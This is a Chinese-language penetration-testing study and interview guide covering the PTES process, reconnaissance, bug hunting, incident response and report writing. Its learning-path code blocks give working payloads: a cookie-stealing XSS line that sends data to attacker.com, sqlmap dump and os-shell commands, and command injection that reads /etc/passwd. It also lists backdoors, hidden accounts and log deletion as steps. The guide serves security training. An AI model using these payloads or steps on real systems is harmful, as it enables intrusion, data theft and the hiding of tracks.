# 渗透测试实战指南

这份文档详细介绍了渗透测试的标准流程、方法和实战技巧，帮助安服工程师掌握独立开展渗透工作的能力。

---

## 📋 渗透测试标准流程 (PTES / 7步法)

面试常问："拿到一个目标，你的渗透流程是什么？" 必须背诵这7步。

### 1. 前期交互 (Pre-engagement Interactions)
*   **确认范围**：明确测试的IP范围、域名、URL列表。
*   **确定目标**：明确是黑盒测试、灰盒测试还是白盒测试。
*   **时间安排**：约定测试时间窗口，避免影响业务。
*   **授权书**：**最重要的法律保障**，必须有书面授权才能进行测试。

### 2. 信息收集 (Intelligence Gathering)
**这是最关键的一步**。搜集子域名、IP、端口、指纹、员工邮箱等。

*   **域名/子域名**:
    *   工具: `OneForAll`, `Sublist3r`, `Layer子域名挖掘机`.
    *   目的: 找到主站防御严密时，边缘业务（子站）的突破口。
    *   *💡 解释：子域名是主域名下的二级域名，如 `blog.example.com` 是 `example.com` 的子域名，通常安全防护较弱。*
*   **指纹识别 (Fingerprinting)**:
    *   **CMS识别**: 判断是WordPress, Dedecms, 还是泛微OA? (工具: `Wappalyzer` 插件, `WhatWeb`).
    *   **中间件/系统**: Nginx/Apache/IIS? Linux/Windows?
    *   **WAF识别**: `wafw00f`.
    *   *💡 解释：指纹识别是通过分析网站的响应特征（如HTTP头、页面内容、文件路径）来判断其使用的技术栈，为后续攻击提供线索。*
*   **端口/服务扫描**:
    *   `Nmap` (详见工具篇).
    *   常见高危端口:
        *   **21 (FTP)**: 弱口令, 匿名访问.
        *   **22 (SSH)** / **3389 (RDP)**: 弱口令爆破.
        *   **445 (SMB)**: 永恒之蓝 (MS17-010).
        *   **3306 (MySQL)** / **6379 (Redis)**: 弱口令, 未授权访问.
        *   **8080 (Tomcat/Jboss)**: 弱口令, 反序列化漏洞.
    *   *💡 解释：端口扫描是探测目标服务器开放了哪些网络端口，每个端口对应不同的服务，可能存在不同的漏洞。*
*   **敏感信息泄露**:
    *   **Google Hacking**: `site:target.com filetype:pdf "internal"`.
    *   **GitHub 泄露**: 搜索 `target.com password/key`.
    *   *💡 解释：通过搜索引擎或代码托管平台查找目标组织意外泄露的敏感信息，如配置文件、密钥、内部文档等。*

### 3. 威胁建模 (Threat Modeling)
*   分析收集到的信息，确定攻击面。
*   例如：发现开了3306端口，就想到SQL注入或弱口令。
*   识别关键资产：数据库、管理员后台、文件上传功能等。
*   评估潜在风险：每个攻击面可能造成的危害程度。

### 4. 漏洞分析 (Vulnerability Analysis)
*   **自动化扫描**：使用扫描器 (AWVS/Nessus) 进行初步扫描。
*   **手工验证**：对扫描结果进行人工验证，排除误报。
*   **重点测试**：
    *   输入点：表单、URL参数、Cookie、HTTP头。
    *   功能点：登录、注册、文件上传、搜索、分页。
    *   逻辑漏洞：支付、权限、验证码等业务逻辑。

### 5. 漏洞利用 (Exploitation)
*   也就是GetShell的过程，利用漏洞获取系统权限。
*   **SQL注入利用**：获取数据库数据、读写文件、执行系统命令。
*   **XSS利用**：窃取Cookie、钓鱼、重定向。
*   **文件上传利用**：上传Webshell获取服务器控制权。
*   **RCE利用**：直接执行系统命令，获取服务器权限。

### 6. 后渗透 (Post Exploitation)
*   **提权**：从低权限用户提升到管理员权限。
*   **内网渗透**：横向移动到其他服务器。
*   **维持权限**：留后门、添加隐藏账号。
*   **清理痕迹**：删除日志、清理操作记录。

### 7. 报告撰写 (Reporting)
*   输出漏洞详情、危害等级、修复建议。
*   **报告结构**：
    *   执行摘要：给管理层看的概要。
    *   漏洞详情：每个漏洞的详细信息。
    *   风险评估：危害等级（高/中/低）。
    *   修复建议：具体的修复方案。
    *   附录：截图、POC代码、日志等证据。

## 🔍 信息收集核心技术

**"渗透的本质是信息收集"**，这是业内名言。

### 1. 子域名枚举
*   **工具**：
    *   `OneForAll`: 功能强大的子域名收集工具。
    *   `Sublist3r`: 快速的子域名枚举工具。
    *   `Layer子域名挖掘机`: 国产工具，支持多种搜索引擎。
*   **方法**：
    *   证书透明度日志查询。
    *   DNS记录枚举。
    *   搜索引擎查询。
    *   爆破字典攻击。

### 2. 端口扫描
*   **Nmap常用命令**：
    *   `nmap -sS <ip>`: 半连接扫描 (TCP SYN)，速度快且隐蔽。
    *   `nmap -sV <ip>`: 探测端口服务的具体版本。
    *   `nmap -p- <ip>`: 扫描全端口 (1-65535)。
    *   `nmap -O <ip>`: 探测操作系统类型。
    *   `nmap -A <ip>`: 综合扫描（包含版本、OS、脚本等）。

### 3. 指纹识别
*   **Web指纹**：
    *   CMS识别：WordPress、Dedecms、Discuz等。
    *   框架识别：Spring、Struts、ThinkPHP等。
    *   中间件识别：Nginx、Apache、IIS、Tomcat等。
*   **识别方法**：
    *   HTTP响应头分析。
    *   页面源码分析。
    *   特定文件路径识别。
    *   错误页面分析。

### 4. 敏感信息收集
*   **Google Hacking**：
    *   `site:target.com filetype:pdf "internal"`: 查找内部文档。
    *   `site:target.com inurl:admin`: 查找管理后台。
    *   `site:target.com inurl:php?id=`: 查找可能存在SQL注入的页面。
*   **GitHub泄露**：
    *   搜索 `target.com password`。
    *   搜索 `target.com api_key`。
    *   搜索 `target.com config`。

## 🎯 漏洞挖掘方法

### 1. SQL注入挖掘
*   **测试点**：
    *   URL参数：`id=1`, `page=2`, `category=3`。
    *   表单输入：登录框、搜索框、注册表单。
    *   Cookie：`user_id=123`, `session_id=abc`。
    *   HTTP头：`X-Forwarded-For`, `User-Agent`。
*   **测试方法**：
    *   **单引号测试**：输入 `'` 观察是否报错。
    *   **逻辑测试**：`and 1=1` (正常), `and 1=2` (异常)。
    *   **时间盲注**：`and sleep(5)` 观察响应时间。
    *   **布尔盲注**：`and 1=1` 和 `and 1=2` 的响应差异。

### 2. XSS挖掘
*   **测试点**：
    *   URL参数：`name=<script>alert(1)</script>`。
    *   表单输入：搜索框、留言板、评论框。
    *   HTTP头：`Referer`, `User-Agent`。
*   **测试方法**：
    *   **反射型XSS**：在URL参数中注入，观察是否在页面中执行。
    *   **存储型XSS**：在表单中注入，观察是否在后续访问中执行。
    *   **DOM型XSS**：分析前端JS代码，查找不安全的DOM操作。

### 3. 文件上传漏洞挖掘
*   **测试方法**：
    *   **绕过后缀名检查**：`test.php.jpg`, `test.php5`, `test.phtml`。
    *   **绕过MIME类型检查**：修改Content-Type为 `image/jpeg`。
    *   **绕过文件内容检查**：在图片中插入Webshell代码。
    *   **双文件上传**：同时上传正常文件和恶意文件。

### 4. 命令执行漏洞挖掘
*   **测试点**：
    *   系统命令执行函数：`system()`, `exec()`, `shell_exec()`, `passthru()`。
    *   路径参数：`file=/etc/passwd`, `path=/var/www/html`。
*   **测试方法**：
    *   **管道符测试**：`;`, `|`, `&&`, `||`。
    *   **命令连接符**：`&`, `;`, `|`, `||`, `&&`。
    *   **反引号测试**：`` `whoami` ``。

### 5. 业务逻辑漏洞挖掘
*   **越权测试**：
    *   修改URL中的ID参数。
    *   修改Cookie中的用户ID。
    *   直接访问管理后台URL。
*   **支付逻辑测试**：
    *   修改订单金额。
    *   修改商品数量（负数）。
    *   重复提交订单。
*   **验证码逻辑测试**：
    *   验证码爆破。
    *   验证码回显。
    *   验证码复用。

## 🚨 应急响应流程

### Windows服务器中毒处理流程

如果面试问："Windows服务器中毒了/中挖矿病毒了，你怎么处理？"

1.  **断网**：拔网线或禁用网卡（防止扩散）。
2.  **找进程**：`taskmgr` (任务管理器) 或 `top` (工具) 查看CPU/内存占用极高的进程。
3.  **查连接**：`netstat -ano` 查看该进程连了哪个外网IP（矿池地址）。
4.  **删文件**：找到进程对应的文件路径，结束进程并删除文件。
5.  **查启动项**：检查注册表启动项、计划任务 (`schtasks`)，防止重启复活。

### Linux服务器中毒处理流程

1.  **断网**：`ifconfig eth0 down` 或 `systemctl stop network`。
2.  **找进程**：`top`, `ps -ef` 查看异常进程。
3.  **查连接**：`netstat -antlp` 查看异常网络连接。
4.  **删文件**：`kill -9 <pid>` 结束进程，`rm -f` 删除恶意文件。
5.  **查启动项**：检查 `/etc/rc.local`, `crontab -l`, `/etc/init.d/`。

### Webshell排查流程

1.  **文件扫描**：使用D盾、河马Webshell查杀工具。
2.  **日志分析**：分析access.log，查找异常请求。
3.  **时间对比**：`find /var/www/html -name "*.php" -mtime -1` 查找最近修改的文件。
4.  **代码审计**：检查可疑文件的代码逻辑。

## 📊 渗透测试报告撰写

### 报告结构

1.  **执行摘要**：
    *   测试范围和时间。
    *   发现的漏洞总数。
    *   高危漏洞概要。
    *   整体安全评估。

2.  **漏洞详情**：
    *   漏洞名称和类型。
    *   风险等级（高/中/低）。
    *   漏洞描述和影响。
    *   POC（概念验证）代码。
    *   修复建议。

3.  **附录**：
    *   截图和证据。
    *   工具使用记录。
    *   参考文档和链接。

### 风险等级评估

*   **高危**：
    *   可直接获取服务器权限。
    *   可直接获取敏感数据。
    *   可造成重大业务损失。
*   **中危**：
    *   需要一定条件才能利用。
    *   可获取部分敏感数据。
    *   可造成一定业务影响。
*   **低危**：
    *   利用条件苛刻。
    *   影响范围有限。
    *   主要是信息泄露。

### 修复建议

*   **立即修复**：高危漏洞，建议24小时内修复。
*   **尽快修复**：中危漏洞，建议1周内修复。
*   **计划修复**：低危漏洞，建议1个月内修复。
*   **持续改进**：建立安全开发生命周期（SDLC）。

## 📖 渗透测试学习路径：从入门到实战

### 阶段一：入门（第1-2周）
**目标**：理解渗透测试流程，掌握信息收集技术

**学习内容**：
1. 学习渗透测试7步法（PTES）
2. 掌握信息收集核心技术
3. 熟悉常用端口和服务

**实战任务**：
*   **子域名枚举**：
    ```bash
    # 使用 OneForAll 收集子域名
    python3 oneforall.py --target example.com run
    
    # 使用 Sublist3r
    python3 sublist3r.py -d example.com
    ```
*   **端口扫描**：
    ```bash
    # Nmap 基础扫描
    nmap -sV -p- 192.168.1.1
    
    # Nmap 脚本扫描
    nmap --script vuln 192.168.1.1
    ```
*   **Google Hacking**：
    ```
    site:example.com filetype:pdf "confidential"
    site:example.com inurl:admin
    site:github.com example.com password
    ```

**推荐靶场**：
*   **DVWA**：入门级 Web 漏洞练习环境
*   **Pikachu**：中文 Web 漏洞练习平台

### 阶段二：基础（第3-4周）
**目标**：掌握常见漏洞挖掘方法

**学习内容**：
1. SQL 注入挖掘与利用
2. XSS 挖掘与利用
3. 文件上传漏洞挖掘
4. 命令执行漏洞挖掘

**实战任务**：
*   **SQL 注入实战**：
    ```bash
    # Sqlmap 自动注入
    sqlmap -u "http://target.com?id=1" --dbs
    sqlmap -u "http://target.com?id=1" -D testdb --tables
    sqlmap -u "http://target.com?id=1" -D testdb -T users --dump
    
    # Sqlmap 进阶用法
    sqlmap -u "http://target.com?id=1" --os-shell  # 尝试获取 Shell
    sqlmap -u "http://target.com?id=1" --tamper=space2comment  # 绕过 WAF
    ```
*   **XSS 实战**：
    ```javascript
    // 反射型 XSS Payload
    <script>alert(1)</script>
    <img src=x onerror=alert(1)>
    
    // 窃取 Cookie
    <script>fetch('http://attacker.com/?c='+document.cookie)</script>
    
    // 存储型 XSS
    // 在留言板、评论区注入，等待管理员访问
    ```
*   **文件上传实战**：
    ```bash
    # 测试文件上传
    # 1. 尝试直接上传 .php
    # 2. 尝试 .php5, .phtml, .php3
    # 3. 尝试 .php.jpg, .jpg.php
    # 4. 修改 Content-Type 为 image/jpeg
    # 5. 图片马：在图片中插入 PHP 代码
    ```
*   **命令执行实战**：
    ```bash
    # 命令注入 Payload
    127.0.0.1; id
    127.0.0.1| whoami
    127.0.0.1&& cat /etc/passwd
    `whoami`
    $(whoami)
    ```

**推荐靶场**：
*   **PortSwigger Web Security Academy**：系统化学习 Web 漏洞
*   **CTFHub**：国内 Web 基础练习平台

### 阶段三：进阶（第5-6周）
**目标**：掌握业务逻辑漏洞和后渗透技术

**学习内容**：
1. 越权漏洞（水平/垂直越权）
2. 支付逻辑漏洞
3. 验证码/密码找回逻辑
4. 应急响应流程

**实战任务**：
*   **越权测试**：
    ```bash
    # 水平越权测试
    # 登录用户 A，访问 /user?id=1
    # 修改为 /user?id=2，看是否能访问用户 B 的数据
    
    # 垂直越权测试
    # 普通用户直接访问 /admin 路径
    # 普通用户修改 Cookie 中的 role=user 为 role=admin
    ```
*   **支付逻辑测试**：
    ```bash
    # 金额篡改
    # 抓包将 price=100 改为 price=0.01
    
    # 数量篡改
    # 将 quantity=1 改为 quantity=-1（导致退款变充值）
    
    # 重复支付
    # 快速多次点击支付按钮，或重放支付请求
    ```
*   **应急响应实战（Windows）**：
    ```cmd
    # 1. 断网（防止扩散）
    # 拔网线或禁用网卡
    
    # 2. 查找异常进程
    tasklist
    tasklist /svc
    
    # 3. 查找异常网络连接
    netstat -ano
    
    # 4. 查找最近修改的文件
    dir /a /o-d
    
    # 5. 查看启动项
    reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    schtasks
    ```
*   **应急响应实战（Linux）**：
    ```bash
    # 1. 断网
    ifconfig eth0 down
    
    # 2. 查找异常进程
    ps -ef
    top
    
    # 3. 查找异常网络连接
    netstat -antlp
    
    # 4. 查找最近修改的文件
    find /var/www/html -name "*.php" -mtime -1
    
    # 5. 查看登录日志
    last
    lastb
    cat /var/log/secure | grep "Failed"
    ```

### 阶段四：实战（第7-8周）
**目标**：独立完成完整渗透测试项目

**学习内容**：
1. 靶场实战（完整渗透）
2. 渗透测试报告撰写
3. 漏洞复现与验证

**实战任务**：
*   **完整渗透测试流程示例**：
    ```
    目标：192.168.1.100
    
    Step 1: 信息收集
    nmap -sV -p- 192.168.1.100
    # 发现：80端口（HTTP）、3306端口（MySQL）
    
    Step 2: 漏洞扫描
    sqlmap -u "http://192.168.1.100?id=1" --dbs
    # 发现 SQL 注入漏洞
    
    Step 3: 漏洞利用
    sqlmap -u "http://192.168.1.100?id=1" -D testdb -T users --dump
    # 获取管理员账号密码
    
    Step 4: 后渗透
    # 登录后台，上传 WebShell
    # 获取服务器权限
    
    Step 5: 清理痕迹
    # 删除日志，清理操作记录
    
    Step 6: 撰写报告
    # 记录漏洞详情、危害等级、修复建议
    ```

*   **渗透测试报告模板**：
    ```
    # 渗透测试报告
    
    ## 1. 执行摘要
    - 测试时间：2025-02-22
    - 测试范围：192.168.1.0/24
    - 发现漏洞：5个（高危2个，中危2个，低危1个）
    
    ## 2. 漏洞详情
    
    ### 2.1 SQL 注入（高危）
    - 漏洞位置：http://target.com?id=1
    - 漏洞描述：存在 SQL 注入漏洞，可获取数据库数据
    - 危害等级：高危
    - 修复建议：使用参数化查询
    
    ## 3. 附录
    - 截图
    - POC 代码
    - 参考链接
    ```

**推荐靶场**：

## 🎯 面试重点（必背）

### 渗透测试流程
1. 前期交互（确认范围、授权书）
2. 信息收集（子域名、端口、指纹）
3. 威胁建模（分析攻击面）
4. 漏洞分析（扫描+手工验证）
5. 漏洞利用（GetShell）
6. 后渗透（提权、内网渗透）
7. 报告撰写（漏洞详情、修复建议）

### 信息收集高频面试题
* **子域名枚举工具有哪些？** → OneForAll、Sublist3r、Layer
* **Nmap 常用参数？** → -sS（半连接）、-sV（版本探测）、-p-（全端口）、-O（系统识别）
* **Google Hacking 语法？** → site:、filetype:、inurl:、intitle:

### 漏洞挖掘高频面试题
* **SQL 注入类型？** → 报错注入、盲注（布尔/时间）、联合查询注入
* **XSS 类型？** → 反射型、存储型、DOM型
* **文件上传绕过思路？** → 绕过后缀、绕过MIME、图片马、00截断

### 应急响应高频面试题
* **Windows 服务器中毒怎么处理？** → 断网 → 查进程 → 查连接 → 删文件 → 查启动项
* **Linux 服务器中毒怎么处理？** → 断网 → ps/netstat → 查文件 → 查日志
* **Webshell 怎么排查？** → 文件扫描（D盾、河马）、日志分析、时间对比
